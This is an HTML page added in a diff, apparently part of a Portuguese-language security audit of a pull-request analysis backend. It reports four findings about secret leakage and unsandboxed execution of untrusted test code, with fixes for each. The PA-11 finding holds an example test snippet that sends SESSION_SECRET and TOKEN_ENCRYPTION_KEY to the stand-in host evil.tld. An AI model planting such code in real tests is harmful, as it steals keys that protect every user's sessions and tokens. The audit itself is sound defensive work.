@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>04 — Segurança</title>
+<style>
+  :root{--bg:#0d1117;--panel:#161b22;--border:#30363d;--text:#e6edf3;--muted:#9da7b3;--crit:#f85149;--high:#ff8c42;--med:#e3b341;--low:#58a6ff;--accent:#7c93ff}
+  *{box-sizing:border-box}
+  body{margin:0;font-family:"Segoe UI",Roboto,system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.55}
+  .wrap{max-width:1040px;margin:0 auto;padding:36px 24px 80px}
+  h1{font-size:27px;margin:0 0 6px}
+  h2{font-size:20px;margin:34px 0 12px;border-bottom:1px solid var(--border);padding-bottom:8px}
+  h3{font-size:16px;margin:0 0 8px}
+  .sub{color:var(--muted);margin:0 0 24px}
+  a{color:var(--accent);text-decoration:none}a:hover{text-decoration:underline}
+  .finding{background:var(--panel);border:1px solid var(--border);border-left-width:4px;border-radius:8px;padding:18px 22px;margin:20px 0}
+  .finding.crit{border-left-color:var(--crit)}
+  .finding.med{border-left-color:var(--med)}
+  .finding.low{border-left-color:var(--low)}
+  .badge{display:inline-block;padding:2px 9px;border-radius:999px;font-size:11.5px;font-weight:700}
+  .b-crit{background:rgba(248,81,73,.16);color:var(--crit);border:1px solid var(--crit)}
+  .b-med{background:rgba(227,179,65,.16);color:var(--med);border:1px solid var(--med)}
+  .b-low{background:rgba(88,166,255,.16);color:var(--low);border:1px solid var(--low)}
+  code{background:#0d1117;border:1px solid var(--border);border-radius:4px;padding:1px 6px;font-size:12.5px}
+  pre{background:#0d1117;border:1px solid var(--border);border-radius:8px;padding:14px 16px;overflow:auto;font-size:12.5px;line-height:1.5}
+  pre code{border:0;padding:0;background:none}
+  .k{color:var(--muted);font-size:13px;text-transform:uppercase;letter-spacing:.04em;margin:14px 0 4px;font-weight:600}
+  .nav{margin:0 0 24px}
+  blockquote{margin:12px 0;padding:10px 16px;border-left:3px solid var(--crit);background:rgba(248,81,73,.08);border-radius:0 6px 6px 0}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="nav"><a href="index.html">← Índice</a></div>
+  <h1>04 — Segurança</h1>
+  <p class="sub">O ponto mais crítico: o pipeline executa código não-confiável do repositório analisado. Achados PA-11 a PA-14.</p>
+
+  <blockquote><b>Premissa central:</b> rodar <code>install_command</code>/<code>test_command</code> e a suíte de testes de um PR significa executar <b>código arbitrário do repositório analisado</b> no processo do backend. Tudo nesta página parte dessa realidade.</blockquote>
+
+  <div class="finding crit">
+    <h3>PA-11 — <code>SESSION_SECRET</code> e <code>TOKEN_ENCRYPTION_KEY</code> vazam para o subprocess não-confiável <span class="badge b-crit">Crítico</span></h3>
+    <div class="k">Local</div>
+    <code>backend/app/services/runner_service.py:287-295</code> (<code>_safe_env</code>)
+    <pre><code>SECRET_ENV_PREFIXES = ("GITHUB_", "OPENAI_", "LANGSMITH_")
+SECRET_ENV_NAMES = {"DATABASE_URL"}
+
+def _safe_env() -> dict[str, str]:
+    safe = {}
+    for key, value in os.environ.items():
+        if key in SECRET_ENV_NAMES: continue
+        if any(key.startswith(prefix) for prefix in SECRET_ENV_PREFIXES): continue
+        safe[key] = value
+    return safe</code></pre>
+    <div class="k">Mecanismo</div>
+    <p>A allowlist/blocklist remove só <code>DATABASE_URL</code> e prefixos <code>GITHUB_</code>/<code>OPENAI_</code>/<code>LANGSMITH_</code>. Mas dois segredos de altíssimo valor <b>não</b> têm esses prefixos e <b>passam</b> para o ambiente do <code>subprocess</code>:</p>
+    <ul>
+      <li><code>SESSION_SECRET</code> — usado em <code>session_service.py:23</code> para assinar (HMAC) os cookies de sessão. Quem o tem <b>forja a sessão de qualquer usuário</b>.</li>
+      <li><code>TOKEN_ENCRYPTION_KEY</code> — usado em <code>token_crypto_service.py:12</code> para cifrar/decifrar os <b>tokens OAuth do GitHub de todos os usuários</b> guardados no banco. Quem o tem decifra todos eles.</li>
+    </ul>
+    <div class="k">Cenário concreto</div>
+    <p>Um PR malicioso adiciona em qualquer arquivo de teste:</p>
+    <pre><code>import os, urllib.request
+urllib.request.urlopen("https://evil.tld/x?s=" + os.environ.get("SESSION_SECRET","")
+                       + "&k=" + os.environ.get("TOKEN_ENCRYPTION_KEY",""))</code></pre>
+    <p>Ao analisar esse PR, <code>pytest</code> roda esse teste no servidor → os segredos são exfiltrados → o atacante forja sessões e decifra tokens OAuth de todos os usuários. <b>Comprometimento total da multi-tenância.</b></p>
+    <div class="k">Correção (imediata)</div>
+    <p>Inverter para <b>allowlist</b>: o subprocess recebe só um conjunto mínimo conhecido (<code>PATH</code>, <code>HOME</code>, <code>LANG</code>, e o que o toolchain exigir), nunca herdando o ambiente inteiro. Ver <a href="fixes/03-vazamento-segredos.md">fixes/03</a>.</p>
+  </div>
+
+  <div class="finding crit">
+    <h3>PA-12 — Execução de código arbitrário sem sandbox/isolamento <span class="badge b-crit">Crítico</span></h3>
+    <div class="k">Local</div>
+    <code>runner_service.py:249-284</code> (<code>run_command</code> com <code>shell=True</code>), chamado pelos três gates no mesmo processo/host do backend.
+    <div class="k">Mecanismo</div>
+    <p>Mesmo com PA-11 corrigido, o código do PR ainda roda com os privilégios do processo do backend: acesso à rede interna (metadata da cloud, banco em <code>/tmp</code>-reachable, serviços internos), ao filesystem da aplicação e à possibilidade de consumir CPU/disco (DoS). A allowlist de env reduz o vazamento de segredos, mas não isola a execução.</p>
+    <div class="k">Impacto</div>
+    <p>SSRF para o endpoint de metadados da cloud (roubo de credenciais de infra), leitura do código/segredos montados no container, mineração/DoS, pivot para o Postgres. Isto é inerente a "rodar testes de PR" — precisa de isolamento de verdade.</p>
+    <div class="k">Correção</div>
+    <p>Executar a análise em um sandbox descartável e sem rede privilegiada: container efêmero por run com rede egress restrita, usuário não-root, limites de CPU/mem/disco e sem credenciais de infra montadas — ou delegar a execução ao runner do próprio repositório (GitHub Actions), onde o blast radius é a conta do cliente, não a sua. Ver <a href="fixes/03-vazamento-segredos.md">fixes/03</a> e <a href="fixes/02-runner-ambiente-e-toolchain.md">fixes/02</a>.</p>
+  </div>
+
+  <div class="finding med">
+    <h3>PA-13 — Comandos configuráveis executados com <code>shell=True</code>; saída persistida pode conter segredos <span class="badge b-med">Médio</span></h3>
+    <div class="k">Local</div>
+    <code>runner_service.py:258</code> (<code>subprocess.run(command, shell=True)</code>) · <code>coverage_execution_config</code> (<code>install_command</code>, <code>test_command</code>)
+    <div class="k">Mecanismo</div>
+    <p>Os comandos vêm de configuração editável por admins do repositório e são passados <em>verbatim</em> ao shell. Combinado com PA-11/PA-12, um admin (ou qualquer um que consiga editar a config) tem execução de comando estável no servidor. Além disso, <code>stdout</code>/<code>stderr</code> (últimos 4000 chars) são salvos em <code>coverage_result_json.commands[]</code> e podem ser publicados em comentários no GitHub (<code>github_publication_service</code>) — se o build imprimir um token/secret, ele é persistido e exposto.</p>
+    <div class="k">Correção</div>
+    <p>Após o isolamento (PA-12), tratar <code>install_command</code>/<code>test_command</code> como input não-confiável; idealmente restringir a um conjunto de comandos/templates conhecidos por linguagem em vez de shell livre, e redigir a saída antes de persistir. Ver <a href="fixes/03-vazamento-segredos.md">fixes/03</a>.</p>
+  </div>
+
+  <div class="finding low">
+    <h3>PA-14 — <code>redacted_command</code> só redige o token do clone, não a saída dos comandos <span class="badge b-low">Baixo</span></h3>
+    <div class="k">Local</div>
+    <code>runner_service.py:241-246</code> (<code>redacted_command</code>) e <code>CommandResult.to_snapshot</code> (linha 38)
+    <div class="k">Mecanismo</div>
+    <p><code>redacted_command</code> só substitui <code>x-access-token:...@</code> no <em>texto do comando</em>. O <code>stdout</code>/<code>stderr</code> guardados no snapshot não passam por nenhuma redação. Como o token de instalação é injetado na URL de clone e pode aparecer em mensagens de erro de rede/git, há risco de o token de instalação (ou outros segredos ecoados pelo build) acabar no snapshot e em comentários do GitHub.</p>
+    <div class="k">Correção</div>
+    <p>Aplicar uma redação de padrões (tokens <code>ghs_</code>/<code>github_pat_</code>, <code>x-access-token</code>, chaves) também sobre <code>stdout</code>/<code>stderr</code> antes de persistir. Ver <a href="fixes/03-vazamento-segredos.md">fixes/03</a>.</p>
+  </div>
+
+  <h2>Itens de segurança que estão corretos (manter)</h2>
+  <ul>
+    <li><b>Verificação de assinatura do webhook</b> com <code>hmac.compare_digest</code> (constante no tempo) — correto.</li>
+    <li><b>Validação de path-traversal no tarball</b> (<code>_validate_archive_members</code>, <code>extractall(filter="data")</code>) e no <code>working_directory</code> (<code>is_relative_to</code>) — boas defesas, manter.</li>
+    <li><b>Tokens de instalação de curta duração</b> em vez de PAT — alinhado ao gotcha do <code>backend/CLAUDE.md</code> ("Do not add <code>GITHUB_TOKEN</code> back").</li>
+    <li><b>CSRF</b> exigido nas rotas mutáveis (<code>require_csrf_token</code>) — correto.</li>
+  </ul>
+  <p style="margin-top:18px"><a href="03-debito-tecnico.html">← Débito técnico</a> · <a href="fixes/README.md">Plano de correção →</a></p>
+</div>
+</body>
+</html>
